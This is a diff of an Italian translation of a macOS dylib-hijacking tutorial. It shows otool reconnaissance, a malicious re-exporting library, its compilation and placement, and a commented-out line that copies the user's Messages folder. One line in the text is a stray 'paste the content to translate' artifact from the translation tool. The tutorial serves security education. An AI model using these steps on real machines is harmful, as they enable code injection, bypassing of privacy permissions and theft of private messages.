@@ -22,7 +22,7 @@ execv("/bin/bash", 0);
 //system("cp -r ~/Library/Messages/ /tmp/Messages/");
 }
 ```
-Binario da attaccare:
+Binary da attaccare:
 ```c
 // gcc hello.c -o hello
 #include <stdio.h>
@@ -66,7 +66,7 @@ path @loader_path/../lib2 (offset 12)
 
 {{#tab name="@rpath"}}
 ```bash
-# Check librareis loaded using @rapth and the used versions
+# Check libraries loaded using @rpath and the versions used
 otool -l "/Applications/VulnDyld.app/Contents/Resources/lib/binary" | grep "@rpath" -A 3
 name @rpath/lib.dylib (offset 24)
 time stamp 2 Thu Jan  1 01:00:02 1970
@@ -77,7 +77,7 @@ compatibility version 1.0.0
 {{#endtab}}
 {{#endtabs}}
 
-Con le informazioni precedenti sappiamo che **non sta verificando la signature delle libraries caricate** e che **sta tentando di caricare una library da**:
+Con le informazioni precedenti sappiamo che **non sta verificando la firma delle librerie caricate** e che **sta tentando di caricare una libreria da**:
 
 - `/Applications/VulnDyld.app/Contents/Resources/lib/lib.dylib`
 - `/Applications/VulnDyld.app/Contents/Resources/lib2/lib.dylib`
@@ -90,7 +90,7 @@ pwd
 find ./ -name lib.dylib
 ./Contents/Resources/lib2/lib.dylib
 ```
-Quindi, è possibile effettuare un hijack! Crea una library che **esegua del codice arbitrario ed esporti le stesse funzionalità** della library legittima, effettuandone il reexport. E ricorda di compilarla con le versioni previste:
+Quindi, è possibile effettuare un hijacking! Crea una libreria che **esegua del codice arbitrario ed esporti le stesse funzionalità** della libreria legittima, riesportandola. E ricorda di compilarla con le versioni previste:
 ```objectivec:lib.m
 #import <Foundation/Foundation.h>
 
@@ -99,12 +99,12 @@ void custom(int argc, const char **argv) {
 NSLog(@"[+] dylib hijacked in %s", argv[0]);
 }
 ```
-Incolla qui il contenuto da tradurre.
+Incolla il contenuto da tradurre.
 ```bash
 gcc -dynamiclib -current_version 1.0 -compatibility_version 1.0 -framework Foundation /tmp/lib.m -Wl,-reexport_library,"/Applications/VulnDyld.app/Contents/Resources/lib2/lib.dylib" -o "/tmp/lib.dylib"
 # Note the versions and the reexport
 ```
-Il percorso di reexport creato nella libreria è relativo al loader; cambiamolo in un percorso assoluto verso la libreria da esportare:
+Il percorso di reexport creato nella library è relativo al loader; modifichiamolo in un percorso assoluto verso la library da esportare:
 ```bash
 #Check relative
 otool -l /tmp/lib.dylib| grep REEXPORT -A 2
@@ -121,11 +121,11 @@ cmd LC_REEXPORT_DYLIB
 cmdsize 128
 name /Applications/Burp Suite Professional.app/Contents/Resources/jre.bundle/Contents/Home/lib/libjli.dylib (offset 24)
 ```
-Infine, copialo semplicemente nella **posizione sottoposta a hijacking**:
+Infine, copialo semplicemente nella **posizione hijacked**:
 ```bash
 cp lib.dylib "/Applications/VulnDyld.app/Contents/Resources/lib/lib.dylib"
 ```
-E **esegui** il binary e verifica che la **library sia stata caricata**:
+E **esegui** il binary e verifica che la **libreria sia stata caricata**:
 
 <pre class="language-context"><code class="lang-context">"/Applications/VulnDyld.app/Contents/Resources/lib/binary"
 <strong>2023-05-15 15:20:36.677 binary[78809:21797902] [+] dylib hijacked in /Applications/VulnDyld.app/Contents/Resources/lib/binary
@@ -133,16 +133,15 @@ E **esegui** il binary e verifica che la **library sia stata caricata**:
 </code></pre>
 
 > [!TIP]
-> Un interessante writeup su come abusare di questa vulnerabilità per abusare dei permessi della fotocamera di telegram è disponibile in [https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/) <sup>[[1]](#references)</sup>
+> Un'utile writeup su come abusare di questa vulnerabilità per sfruttare i permessi della camera di telegram è disponibile in [https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/) <sup>[[1]](#references)</sup>
 
 ## Scala maggiore
 
-Se stai pianificando di provare a injectare library in binary non previsti, puoi controllare gli event messages per scoprire quando la library viene caricata all'interno di un processo (in questo caso rimuovi l'esecuzione di printf e di `/bin/bash`).
+Se stai pianificando di provare a iniettare librerie in binary imprevisti, puoi controllare i messaggi degli eventi per scoprire quando la libreria viene caricata all'interno di un processo (in questo caso rimuovi `printf` e l'esecuzione di `/bin/bash`).
 ```bash
 sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "[+] dylib"'
 ```
-## Riferimenti
+## References
 
-- [1] [Bypassing TCC con Telegram in macOS](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)
-
+- [1] [CVE-2023-26818 - Bypass di TCC con Telegram in macOS](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)
 {{#include ../../../../banners/hacktricks-training.md}}
